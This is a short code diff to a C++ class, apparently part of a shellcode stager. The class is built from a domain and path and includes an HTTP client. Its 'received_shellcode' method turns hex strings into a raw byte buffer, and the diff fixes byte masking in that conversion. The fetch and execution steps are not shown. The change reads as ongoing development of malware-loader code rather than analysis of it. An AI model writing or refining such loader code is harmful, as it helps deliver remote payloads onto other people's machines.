@@ -2,6 +2,7 @@
 #include "util.h"
 #include "httpClient.h"
 #include <vector>
+#include <memory>
 #include <iostream>
 
 webcc::webcc(std::string domain, std::string path):domain(domain),path(path)
@@ -29,7 +30,7 @@ webcc::received_shellcode(void)
     unsigned char *shellcode = (unsigned char*)malloc(len);
     for (int i = 0; i < len; i++) {
         long int li2 = strtol(v[i].c_str(), NULL, 16);
-        shellcode[i] = li2;
+        shellcode[i] = li2 & 0xFF;
     }
 
     return std::pair<unsigned char*, int>(shellcode, len);
